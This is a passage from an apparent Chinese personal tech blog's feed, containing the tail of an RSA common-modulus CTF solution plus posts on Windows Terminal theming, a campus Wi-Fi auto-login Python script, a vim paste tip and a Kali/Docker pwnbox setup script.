class="string">'flag.enc1'</span>, <span class="string">'rb'</span>).read().encode(<span class="string">'hex'</span>),<span class="number">16</span>)</span><br><span class="line">c2 = int(open(<span class="string">'flag.enc2'</span>, <span class="string">'rb'</span>).read().encode(<span class="string">'hex'</span>),<span class="number">16</span>)</span><br><span class="line">e1 = <span class="number">17</span></span><br><span class="line">e2 = <span class="number">65537</span></span><br><span class="line">s = gmpy2.gcdext(e1,e2) <span class="comment"># gmpy2自带欧几里得以及扩展欧几里得算法</span></span><br><span class="line">s1 = s[<span class="number">1</span>]</span><br><span class="line">s2 = s[<span class="number">2</span>]</span><br><span class="line"><span class="keyword">if</span> s1&lt;<span class="number">0</span>:</span><br><span class="line">	s1 = - s1</span><br><span class="line">	c1 = gmpy2.invert(c1, n)</span><br><span class="line"><span class="keyword">elif</span> s2&lt;<span class="number">0</span>:</span><br><span class="line">	s2 = - s2</span><br><span class="line">	c2 = gmpy2.invert(c2, n)</span><br><span class="line">m = gmpy2.powmod(c1, s1, n) * gmpy2.powmod(c2, s2, n) % n</span><br><span class="line"><span class="keyword">print</span> hex(m)[<span class="number">2</span>:].decode(<span class="string">'hex'</span>)</span><br></pre></td></tr></table></figure>
<h1 id="tips">tips</h1>
<h1 id="参考">参考</h1>
<p><a href="https://veritas501.space/2017/03/01/密码学笔记/" target="_blank" rel="noopener">密码学笔记-veritas</a></p>
<p><a href="https://www.anquanke.com/post/id/84632" target="_blank" rel="noopener">CTF中RSA的常见攻击方法</a></p>
<section class="footnotes" role="doc-endnotes">
<hr />
<ol>
<li id="fn1" role="doc-endnote"><p><span class="math inline">\(\varphi (N)=\varphi (p)\varphi (q)=(p−1)(q−1)\)</span>欧拉函数是<a href="https://zh.wikipedia.org/wiki/積性函數" target="_blank" rel="noopener">积性函数</a>，即是说若<span class="math inline">\(m\)</span>,<span class="math inline">\(n\)</span>互质，<span class="math inline">\(\varphi (mn)=\varphi (m)\varphi (n)\)</span>，如果<span class="math inline">\(n\)</span>为质数，那么<span class="math inline">\(\varphi(n)=n-1\)</span><a href="#fnref1" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn2" role="doc-endnote"><p>同余符号<span class="math inline">\(\equiv\)</span>：给定一个正整数n，如果<strong>两个整数a和b满足a-b能被n整除</strong>，即<span class="math inline">\((a-b)\ mod\ n=0\)</span>，那么就称整数a与b对模n同余<strong>，</strong>记作<span class="math inline">\(a \equiv b \ (mod\ n)\)</span><strong>，</strong>同时可成立<span class="math inline">\(a \ mod \ n=b\)</span>。<a href="#fnref2" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
</ol>
</section>
]]></content>
      <tags>
        <tag>encrypt</tag>
        <tag>RSA</tag>
      </tags>
  </entry>
  <entry>
    <title>tool</title>
    <url>/2020/10/04/tool/</url>
    <content><![CDATA[<h1 id="实用工具">实用工具</h1>
<h2 id="windows-terminal">Windows Terminal</h2>
<p>Windows 终端是一个面向命令行工具和 shell（如命令提示符、PowerShell 和适用于 Linux 的 Windows 子系统 (WSL)）用户的新式终端应用程序。 它的主要功能包括多个选项卡、窗格、Unicode 和 UTF-8 字符支持、GPU 加速文本呈现引擎，你还可用它来创建你自己的主题并自定义文本、颜色、背景和快捷方式。</p>
<p>不知道比系统自带的Powershell和cmd高了多少B格</p>
<p><img src="https://i.loli.net/2020/10/04/LpGeHZxwJBjAXQm.png" alt="image-20201004183225768" /></p>
]]></content>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows Terminal</title>
    <url>/2020/08/29/terminal/</url>
    <content><![CDATA[<h1 id="前言">前言</h1>
<p>Powershell这体验着实是不行，乱码，颜色无法显示。是时候该换Windows Terminal了</p>
<h1 id="安装">安装</h1>
<h2 id="github安装">Github安装</h2>
<p>下载页面<a href="https://github.com/microsoft/terminal/releases" target="_blank" rel="noopener">Github</a>，下载下来安装就可以了，值得注意的是，如果从 GitHub 安装，终端将不会自动更新为新版本。</p>
<h2 id="microsoft-store安装推荐">Microsoft Store安装（推荐）</h2>
<p>直接在开始菜单中打开Microsoft Store，搜索Windows Terminal，安装即可</p>
<h1 id="美化">美化</h1>
<p>虽然刚安装好的Terminal看起来还可以，不过还是不够美观，继续优化</p>
<h2 id="powerline">Powerline</h2>
<p>Powerline 提供自定义的命令提示符体验，提供 Git 状态颜色编码和提示符。</p>
<h3 id="安装字体">安装字体</h3>
<p>安装 Powerline 字体，<a href="https://github.com/microsoft/cascadia-code/releases" target="_blank" rel="noopener">Github下载</a></p>
<h3 id="安装posh-git-和-oh-my-posh">安装Posh-Git 和 Oh-My-Posh</h3>
<p>打开Powershell，执行下列命令，执行途中全部选Yes</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Install-Module</span> posh-git -Scope CurrentUser</span><br><span class="line"><span class="built_in">Install-Module</span> oh-my-posh -Scope CurrentUser</span><br></pre></td></tr></table></figure>
<h3 id="自定义-powershell-提示符">自定义 PowerShell 提示符</h3>
<p>找到Powershell的配置文件，当前用户的配置文件位置在<code>C:\Users\用户名\Documents\WindowsPowerShell\</code>,一般叫<code>profile.ps1</code>或者<code>Microsoft.PowerShell_profile.ps1</code>，打开配置文件，将以下内容添加到末尾：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> posh-git</span><br><span class="line"><span class="built_in">Import-Module</span> oh-my-posh</span><br><span class="line">Set-Theme Paradox</span><br></pre></td></tr></table></figure>
<h3 id="设置字体">设置字体</h3>
<p>打开Windows Terminal的配置文件，找到Powershell的配置，即<code>name</code>为<code>Windows PowerShell</code>的项，添加<code>"fontFace": "Cascadia Code PL"</code>，这样就大功告成了。</p>
<h2 id="配色方案以及背景">配色方案以及背景</h2>
<p>这里就直接放上配置文件了</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"$schema"</span>: <span class="string">"https://aka.ms/terminal-profiles-schema"</span>,</span><br><span class="line">    <span class="attr">"defaultProfile"</span>: <span class="string">"&#123;61c54bbd-c2c6-5271-96e7-009a87ff44bf&#125;"</span>,</span><br><span class="line">    </span><br><span class="line">    // 全局配置</span><br><span class="line">    // 关闭多个选项卡时是否需要确认</span><br><span class="line">    "confirmCloseAllTabs": false,</span><br><span class="line">    // 主题</span><br><span class="line">    "theme":"dark",</span><br><span class="line">    // If enabled, selections are automatically copied to your clipboard.</span><br><span class="line">    "copyOnSelect": false,</span><br><span class="line">    // If enabled, formatted data is also copied to your clipboard</span><br><span class="line">    "copyFormatting": false,</span><br><span class="line"></span><br><span class="line">	// 配置文件</span><br><span class="line">    "profiles":</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">"defaults"</span>:</span><br><span class="line">        &#123;</span><br><span class="line">            // Put settings here that you want to apply to all profiles.</span><br><span class="line">            // 配色方案</span><br><span class="line">            "colorScheme": "Gruvbox Dark",</span><br><span class="line">            // 指针样式</span><br><span class="line">            "cursorShape": "vintage"</span><br><span class="line">        &#125;,</span><br><span class="line">        "list":</span><br><span class="line">        [</span><br><span class="line">            &#123;</span><br><span class="line">                // Powershell配置</span><br><span class="line">                "guid": "&#123;61c54bbd-c2c6-5271-96e7-009a87ff44bf&#125;",</span><br><span class="line">                "name": "Windows PowerShell",</span><br><span class="line">                "commandline": "powershell.exe",</span><br><span class="line">                // 启动时位置</span><br><span class="line">                "startingDirectory": "D:/",</span><br><span class="line">                // 字体</span><br><span class="line">                "fontFace": "Cascadia Code PL",</span><br><span class="line">                // 启用 acrylic 背景，这里自行调整</span><br><span class="line">                "useAcrylic": true,</span><br><span class="line">                // 设置 Acrylic 不透明度</span><br><span class="line">                "acrylicOpacity": 0.5,</span><br><span class="line">                // 背景图片</span><br><span class="line">                "backgroundImage": "背景图片位置",</span><br><span class="line">                // 背景图片不透明度</span><br><span class="line">                "backgroundImageOpacity":0.6,</span><br><span class="line">                "hidden": false</span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                // cmd配置</span><br><span class="line">                "guid": "&#123;0caa0dad-35be-5f56-a8ff-afceeeaa6101&#125;",</span><br><span class="line">                "name": "命令提示符",</span><br><span class="line">                "commandline": "cmd.exe",</span><br><span class="line">                "hidden": false</span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">"guid"</span>: <span class="string">"&#123;b453ae62-4e3d-5e58-b989-0a998ec441b8&#125;"</span>,</span><br><span class="line">                <span class="attr">"hidden"</span>: <span class="literal">false</span>,</span><br><span class="line">                <span class="attr">"name"</span>: <span class="string">"Azure Cloud Shell"</span>,</span><br><span class="line">                <span class="attr">"source"</span>: <span class="string">"Windows.Terminal.Azure"</span></span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    // 配色方案</span><br><span class="line">    "schemes": [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">"name"</span>: <span class="string">"Gruvbox Dark"</span>,</span><br><span class="line">            <span class="attr">"black"</span>: <span class="string">"#1e1e1e"</span>,</span><br><span class="line">            <span class="attr">"red"</span>: <span class="string">"#be0f17"</span>,</span><br><span class="line">            <span class="attr">"green"</span>: <span class="string">"#868715"</span>,</span><br><span class="line">            <span class="attr">"yellow"</span>: <span class="string">"#cc881a"</span>,</span><br><span class="line">            <span class="attr">"blue"</span>: <span class="string">"#377375"</span>,</span><br><span class="line">            <span class="attr">"purple"</span>: <span class="string">"#a04b73"</span>,</span><br><span class="line">            <span class="attr">"cyan"</span>: <span class="string">"#578e57"</span>,</span><br><span class="line">            <span class="attr">"white"</span>: <span class="string">"#978771"</span>,</span><br><span class="line">            <span class="attr">"brightBlack"</span>: <span class="string">"#7f7061"</span>,</span><br><span class="line">            <span class="attr">"brightRed"</span>: <span class="string">"#f73028"</span>,</span><br><span class="line">            <span class="attr">"brightGreen"</span>: <span class="string">"#aab01e"</span>,</span><br><span class="line">            <span class="attr">"brightYellow"</span>: <span class="string">"#f7b125"</span>,</span><br><span class="line">            <span class="attr">"brightBlue"</span>: <span class="string">"#719586"</span>,</span><br><span class="line">            <span class="attr">"brightPurple"</span>: <span class="string">"#c77089"</span>,</span><br><span class="line">            <span class="attr">"brightCyan"</span>: <span class="string">"#7db669"</span>,</span><br><span class="line">            <span class="attr">"brightWhite"</span>: <span class="string">"#e6d4a3"</span>,</span><br><span class="line">            <span class="attr">"background"</span>: <span class="string">"#1e1e1e"</span>,</span><br><span class="line">            <span class="attr">"foreground"</span>: <span class="string">"#e6d4a3"</span></span><br><span class="line">        &#125;</span><br><span class="line">    ],</span><br><span class="line"></span><br><span class="line">    // Add custom keybindings to this array.</span><br><span class="line">    // To unbind a key combination from your defaults.json, set the command to "unbound".</span><br><span class="line">    // To learn more about keybindings, visit https://aka.ms/terminal-keybindings</span><br><span class="line">    "keybindings":</span><br><span class="line">    [</span><br><span class="line">        // Copy and paste are bound to Ctrl+Shift+C and Ctrl+Shift+V in your defaults.json.</span><br><span class="line">        // These two lines additionally bind them to Ctrl+C and Ctrl+V.</span><br><span class="line">        // To learn more about selection, visit https://aka.ms/terminal-selection</span><br><span class="line">        &#123; <span class="attr">"command"</span>: &#123;<span class="attr">"action"</span>: <span class="string">"copy"</span>, <span class="attr">"singleLine"</span>: <span class="literal">false</span> &#125;, <span class="attr">"keys"</span>: <span class="string">"ctrl+c"</span> &#125;,</span><br><span class="line">        &#123; <span class="attr">"command"</span>: <span class="string">"paste"</span>, <span class="attr">"keys"</span>: <span class="string">"ctrl+v"</span> &#125;,</span><br><span class="line"></span><br><span class="line">        // Press Ctrl+Shift+F to open the search box</span><br><span class="line">        &#123; <span class="attr">"command"</span>: <span class="string">"find"</span>, <span class="attr">"keys"</span>: <span class="string">"ctrl+shift+f"</span> &#125;,</span><br><span class="line"></span><br><span class="line">        // Press Alt+Shift+D to open a new pane.</span><br><span class="line">        // - <span class="string">"split"</span>: <span class="string">"auto"</span> makes this pane open in the direction that provides the most surface area.</span><br><span class="line">        // - <span class="string">"splitMode"</span>: <span class="string">"duplicate"</span> makes the new pane use the focused pane's profile.</span><br><span class="line">        // To learn more about panes, visit https://aka.ms/terminal-panes</span><br><span class="line">        &#123; <span class="attr">"command"</span>: &#123; <span class="attr">"action"</span>: <span class="string">"splitPane"</span>, <span class="attr">"split"</span>: <span class="string">"auto"</span>, <span class="attr">"splitMode"</span>: <span class="string">"duplicate"</span> &#125;, <span class="attr">"keys"</span>: <span class="string">"alt+shift+d"</span> &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="最终效果">最终效果</h1>
<p><img src="https://i.loli.net/2020/08/30/ZAQMaHCeidwOlRu.png" alt="image-20200830113904131" /></p>
<p>舒服了</p>
]]></content>
      <tags>
        <tag>工具</tag>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>wifilogin</title>
    <url>/2020/09/27/wifilogin/</url>
    <content><![CDATA[<h1 id="前言">前言</h1>
<p>做个开机自动登录WiFi脚本</p>
<h1 id="配置环境">配置环境</h1>
<ul>
<li>Python 3.7</li>
<li>Pycharm</li>
<li>Fiddler Everywhere</li>
</ul>
<h1 id="抓包分析">抓包分析</h1>
<p><strong>登陆界面</strong></p>
<p><img src="https://gitee.com/a1oyss/image-uploader/raw/master/img/image-20200929092828678.png" alt="image-20200929092828678" /></p>
<p><strong>请求地址</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;211.69.15.33:9999&#x2F;portalAuthAction.do</span><br></pre></td></tr></table></figure>
<p><strong>请求数据</strong></p>
<p><img src="https://gitee.com/a1oyss/image-uploader/raw/master/img/image-20201004170239733.png" alt="image-20201004170239733" /></p>
<p>其中关键的只有wlanuserip，wlanacIp，userid，useridtemp，passwd。</p>
<p>wlanuserip，wlanacIp可以通过ipconfig获取，也可以访问校园网界面，获取参数，这里选择后者。</p>
<h1 id="python代码">Python代码</h1>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">from</span> win10toast <span class="keyword">import</span> ToastNotifier</span><br><span class="line"><span class="keyword">import</span> webbrowser</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HAITWIFI</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.username = <span class="string">'用户名'</span></span><br><span class="line">        self.password = <span class="string">'密码'</span></span><br><span class="line">        <span class="comment"># 移动@gxyyd  联通@gxylt  电信@gxydx</span></span><br><span class="line">        self.operator = &#123;<span class="string">'1'</span>: <span class="string">'@gxyyd'</span>, <span class="string">'2'</span>: <span class="string">'@gxylt'</span>, <span class="string">'3'</span>: <span class="string">'@gxydx'</span>&#125;.get(<span class="string">'1'</span>, <span class="string">'@gxyyd'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getIP</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="comment"># 获取动态参数</span></span><br><span class="line">        url = <span class="string">'校园网url'</span></span><br><span class="line">        r = requests.get(url)</span><br><span class="line">        soup = BeautifulSoup(r.content, <span class="string">'html5lib'</span>)</span><br><span class="line">        wlanuserip = soup.find(<span class="string">'input'</span>, attrs=&#123;<span class="string">'name'</span>: <span class="string">'wlanuserip'</span>&#125;).attrs[<span class="string">'value'</span>]</span><br><span class="line">        wlanacip = soup.find(<span class="string">'input'</span>, attrs=&#123;<span class="string">'name'</span>: <span class="string">'wlanacIp'</span>&#125;).attrs[<span class="string">'value'</span>]</span><br><span class="line">        <span class="keyword">return</span> wlanuserip, wlanacip</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="comment"># 登录模块</span></span><br><span class="line">        ip = self.getIP()</span><br><span class="line">        login_url = <span class="string">"登录url"</span></span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) '</span></span><br><span class="line">                          <span class="string">'Chrome/85.0.4183.121 Safari/537.36'</span>,</span><br><span class="line">            <span class="string">'Referer'</span>: <span class="string">'校园网url'</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        post_data = &#123;<span class="string">'wlanuserip'</span>: ip[<span class="number">0</span>],</span><br><span class="line">                     <span class="string">'wlanacname'</span>: <span class="string">'HAIT-SR8808'</span>,</span><br><span class="line">                     <span class="string">'chal_id'</span>: <span class="string">''</span>,</span><br><span class="line">                     <span class="string">'chal_vector'</span>: <span class="string">''</span>,</span><br><span class="line">                     <span class="string">'auth_type'</span>: <span class="string">'PAP'</span>,</span><br><span class="line">                     <span class="string">'seq_id'</span>: <span class="string">''</span>,</span><br><span class="line">                     <span class="string">'req_id'</span>: <span class="string">''</span>,</span><br><span class="line">                     <span class="string">'wlanacIp'</span>: ip[<span class="number">1</span>],</span><br><span class="line">                     <span class="string">'ssid'</span>: <span class="string">''</span>,</span><br><span class="line">                     <span class="string">'vlan'</span>: <span class="string">''</span>,</span><br><span class="line">                     <span class="string">'mac'</span>: <span class="string">''</span>,</span><br><span class="line">                     <span class="string">'message'</span>: <span class="string">''</span>,</span><br><span class="line">                     <span class="string">'bank_acct'</span>: <span class="string">''</span>,</span><br><span class="line">                     <span class="string">'isCookies'</span>: <span class="string">''</span>,</span><br><span class="line">                     <span class="string">'version'</span>: <span class="string">'0'</span>,</span><br><span class="line">                     <span class="string">'authkey'</span>: <span class="string">'88----89'</span>,</span><br><span class="line">                     <span class="string">'url'</span>: <span class="string">''</span>,</span><br><span class="line">                     <span class="string">'usertime'</span>: <span class="string">'0'</span>,</span><br><span class="line">                     <span class="string">'listpasscode'</span>: <span class="string">'0'</span>,</span><br><span class="line">                     <span class="string">'listgetpass'</span>: <span class="string">'0'</span>,</span><br><span class="line">                     <span class="string">'getpasstype'</span>: <span class="string">'0'</span>,</span><br><span class="line">                     <span class="string">'randstr'</span>: <span class="string">'7150'</span>,</span><br><span class="line">                     <span class="string">'domain'</span>: <span class="string">''</span>,</span><br><span class="line">                     <span class="string">'isRadiusProxy'</span>: <span class="string">'true'</span>,</span><br><span class="line">                     <span class="string">'usertype'</span>: <span class="string">'0'</span>,</span><br><span class="line">                     <span class="string">'isHaveNotice'</span>: <span class="string">'0'</span>,</span><br><span class="line">                     <span class="string">'times'</span>: <span class="number">12</span>,</span><br><span class="line">                     <span class="string">'weizhi'</span>: <span class="number">0</span>,</span><br><span class="line">                     <span class="string">'smsid'</span>: <span class="string">''</span>,</span><br><span class="line">                     <span class="string">'freeuser'</span>: <span class="string">''</span>,</span><br><span class="line">                     <span class="string">'freepasswd'</span>: <span class="string">''</span>,</span><br><span class="line">                     <span class="string">'listwxauth'</span>: <span class="string">'0'</span>,</span><br><span class="line">                     <span class="string">'templatetype'</span>: <span class="string">'1'</span>,</span><br><span class="line">                     <span class="string">'tname'</span>: <span class="string">'gxy_pc_portal'</span>,</span><br><span class="line">                     <span class="string">'logintype'</span>: <span class="string">'0'</span>,</span><br><span class="line">                     <span class="string">'act'</span>: <span class="string">''</span>,</span><br><span class="line">                     <span class="string">'is189'</span>: <span class="string">'false'</span>,</span><br><span class="line">                     <span class="string">'terminalType'</span>: <span class="string">''</span>,</span><br><span class="line">                     <span class="string">'checkterminal'</span>: <span class="string">'true'</span>,</span><br><span class="line">                     <span class="string">'portalpageid'</span>: <span class="string">'23'</span>,</span><br><span class="line">                     <span class="string">'listfreeauth'</span>: <span class="string">'0'</span>,</span><br><span class="line">                     <span class="string">'viewlogin'</span>: <span class="string">'1'</span>,</span><br><span class="line">                     <span class="string">'userid'</span>: self.username + self.operator,</span><br><span class="line">                     <span class="string">'authGroupId'</span>: <span class="string">''</span>,</span><br><span class="line">                     <span class="string">'smsoperatorsflat'</span>: <span class="string">''</span>,</span><br><span class="line">                     <span class="string">'useridtemp'</span>: self.username + self.operator,</span><br><span class="line">                     <span class="string">'passwd'</span>: self.password,</span><br><span class="line">                     <span class="string">'operator'</span>: self.operator&#125;</span><br><span class="line">        r = requests.post(url=login_url, data=post_data, headers=headers)</span><br><span class="line">        bs = BeautifulSoup(r.content, <span class="string">'html5lib'</span>)</span><br><span class="line">        toaster = ToastNotifier()</span><br><span class="line">        <span class="keyword">if</span> bs.find_all(<span class="string">'input'</span>, id=<span class="string">'loginOut'</span>) != []:</span><br><span class="line">            toaster.show_toast(<span class="string">'WIFI登录'</span>, <span class="string">'登录成功'</span>, icon_path=<span class="string">'D:\\Program Files\\Python37\\DLLs\\py.ico'</span>, duration=<span class="number">2</span>, threaded=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            toaster.show_toast(<span class="string">'WIFI登录'</span>, <span class="string">'登录失败'</span>, icon_path=<span class="string">'D:\\Program Files\\Python37\\DLLs\\py.ico'</span>, duration=<span class="number">2</span>, threaded=<span class="literal">True</span>)</span><br><span class="line">            webbrowser.open(</span><br><span class="line">                <span class="string">'http://url/portalReceiveAction.do?wlanuserip='</span> + ip[<span class="number">0</span>] + <span class="string">'&amp;wlanacname=HAIT-SR8808'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HAITlogin = HAITWIFI()</span><br><span class="line">HAITlogin.login()</span><br></pre></td></tr></table></figure>
<h1 id="添加win10弹窗提醒">添加Win10弹窗提醒</h1>
<p>这里我使用的是win10toast模块，创建对象后，使用<code>show_toast()</code>即可成功弹窗。</p>
<h1 id="开机自启">开机自启</h1>
<ul>
<li><p>方案一 加入Windows 服务</p>
<p>首先使用Pyinstaller将程序编译为exe，然后使用<a href="https://github.com/winsw/winsw/releases" target="_blank" rel="noopener">WinSW</a>，将程序添加为Windows 服务。</p>
<p>优点：B格很高</p>
<p>缺点：有BUG，可能是win10toast的问题，也可能是python打包文件的问题，虽然能完成登录，但无法弹窗。</p></li>
<li><p>方案二 添加到<code>启动</code>文件夹</p>
<p>这种很简单，写一个bat，运行脚本，最后把bat放到<code>AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code>文件夹中即可。</p>
<p>优点：简单，实用</p>
<p>缺点：B格不够，运行太慢，会弹黑框框</p></li>
</ul>
]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>关于vim的复制粘贴</title>
    <url>/2019/06/01/vim/</url>
    <content><![CDATA[<p>学习Canary相关的东西时，因为要从网上复制粘贴各种代码，因为缩进问题，复制完之后的效果惨不忍睹，比如这样：</p>
<p><img src="https://i.loli.net/2020/09/10/fsJqkMKjcIDGrVu.png" alt="vim-2020-09-10-17-23-17" /></p>
<p>过于惨不忍睹，markdown的代码框展现不出来效果</p>
<p>解决方法的话就是在粘贴前先输入<code>:set paste</code>，接着进入insert模式的时候后面就会多个(paste)，这样复制进去的就和你原本看到的一样了</p>
<h1 id="eqweqw">eqweqw</h1>
<h2 id="ewqewqeqw">ewqewqeqw</h2>
<h3 id="eqweqwe">eqweqwe</h3>
<p><code>eweqeqweq</code> <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>._self=self</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
]]></content>
      <tags>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>搭建环境</title>
    <url>/2019/05/30/%E6%90%AD%E5%BB%BA%E7%8E%AF%E5%A2%83/</url>
    <content><![CDATA[<h1 id="kali配置">kali配置</h1>
<h2 id="安装docker">安装docker</h2>
<p>正常情况下用docker官方的文档安装就行，但是执行到下面这条命令时会报错 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo add-apt-repository \</span></span><br><span class="line">   "deb [arch=amd64] https://download.docker.com/linux/ubuntu \</span><br><span class="line"><span class="meta">   $</span><span class="bash">(lsb_release -cs) \</span></span><br><span class="line">   stable"</span><br></pre></td></tr></table></figure> 错误： <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aptsources.distro.NoDistroTemplateException: Error: could not find a distribution template for Kali&#x2F;n&#x2F;a</span><br></pre></td></tr></table></figure> 具体原因是什么至今也没查到，可能是和kali版本有关系吧</p>
<p>解决方法： 自己添加源就可以了 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">deb https://mirrors.aliyun.com/docker-ce/linux/debian wheezy stable</span><br></pre></td></tr></table></figure> 安装成功后执行<code>systemctl enable docker</code>使docker开机自启。</p>
<p>再找一个合适的环境pull下，找了半天发现pwnbox不错，有一个run.sh可以快捷启动环境，但是没有ida调试文件和没有端口映射，自己改了改文件之后就好用多了。</p>
<p>run.sh: <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/usr/bin/env bash</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Run superkojiman/pwnbox container <span class="keyword">in</span> docker.</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Store your .gdbinit, .radare2rc, .vimrc, etc <span class="keyword">in</span> a ./rc directory. The contents will be copied to</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> /root/ <span class="keyword">in</span> the container.</span></span><br><span class="line"></span><br><span class="line">ESC="\x1B["</span><br><span class="line">RESET=$ESC"39m"</span><br><span class="line">RED=$ESC"31m"</span><br><span class="line">GREEN=$ESC"32m"</span><br><span class="line">BLUE=$ESC"34m"</span><br><span class="line"></span><br><span class="line">if [[ -z $&#123;1&#125; ]]; then</span><br><span class="line">    echo -e "$&#123;RED&#125;Missing argument CTF name.$&#123;RESET&#125;"</span><br><span class="line">    exit 0</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">ctf_name=$&#123;1&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Create docker container and run <span class="keyword">in</span> the background</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Add this <span class="keyword">if</span> you need to modify anything <span class="keyword">in</span> /proc:  --privileged </span></span><br><span class="line">docker run -it \</span><br><span class="line">    -h $&#123;ctf_name&#125; \</span><br><span class="line">    -d \</span><br><span class="line">    -p 23946:23946 \</span><br><span class="line">    --security-opt seccomp:unconfined \</span><br><span class="line">    --name $&#123;ctf_name&#125; \</span><br><span class="line">    superkojiman/pwnbox</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Tar config files <span class="keyword">in</span> rc and extract it into the container</span></span><br><span class="line">if [[ -d rc ]]; then</span><br><span class="line">    cd rc</span><br><span class="line">    if [[ -f rc.tar ]]; then</span><br><span class="line">        rm -f rc.tar</span><br><span class="line">    fi</span><br><span class="line">    for i in .*; do</span><br><span class="line">        if [[ ! $&#123;i&#125; == "." &amp;&amp; ! $&#123;i&#125; == ".." ]]; then</span><br><span class="line">            tar rf rc.tar $&#123;i&#125;</span><br><span class="line">        fi</span><br><span class="line">    done</span><br><span class="line">    cd - &gt; /dev/null 2&gt;&amp;1</span><br><span class="line">    cat rc/rc.tar | docker cp - $&#123;ctf_name&#125;:/root/</span><br><span class="line">    rm -f rc/rc.tar</span><br><span class="line">else</span><br><span class="line">    echo -e "$&#123;RED&#125;No rc directory found. Nothing to copy to container.$&#123;RESET&#125;"</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Create stop/rm script <span class="keyword">for</span> container</span></span><br><span class="line">cat &lt;&lt; EOF &gt; $&#123;ctf_name&#125;-stop.sh</span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">docker stop $&#123;ctf_name&#125;</span><br><span class="line">docker rm $&#123;ctf_name&#125;</span><br><span class="line">rm -f $&#123;ctf_name&#125;-stop.sh</span><br><span class="line">EOF</span><br><span class="line">chmod 755 $&#123;ctf_name&#125;-stop.sh</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Create a workdir <span class="keyword">for</span> this CTF</span></span><br><span class="line">docker exec $&#123;ctf_name&#125; mkdir /root/work</span><br><span class="line">docker cp linux_server $&#123;ctf_name&#125;:/root/work</span><br><span class="line">docker cp linux_server64 $&#123;ctf_name&#125;:/root/work</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Get a shell</span></span><br><span class="line">echo -e "$&#123;GREEN&#125;                         ______               $&#123;RESET&#125;"</span><br><span class="line">echo -e "$&#123;GREEN&#125;___________      ___________  /___________  __$&#123;RESET&#125;"</span><br><span class="line">echo -e "$&#123;GREEN&#125;___  __ \\_ | /| / /_  __ \\_  __ \\  __ \\_  |/_/$&#123;RESET&#125;"</span><br><span class="line">echo -e "$&#123;GREEN&#125;__  /_/ /_ |/ |/ /_  / / /  /_/ / /_/ /_&gt;  &lt;  $&#123;RESET&#125;"</span><br><span class="line">echo -e "$&#123;GREEN&#125;_  .___/____/|__/ /_/ /_//_.___/\\____//_/|_|  $&#123;RESET&#125;"</span><br><span class="line">echo -e "$&#123;GREEN&#125;/_/                           by superkojiman  $&#123;RESET&#125;"</span><br><span class="line">echo ""</span><br><span class="line">docker attach $&#123;ctf_name&#125;</span><br></pre></td></tr></table></figure> 需要同目录下有linux_server和linux_server64文件(在ida安装目录下的dbgsrv里面)。</p>
<p>接下来对本机vim进行配置，安装YouCompleteMe和一些缩进的配置。</p>
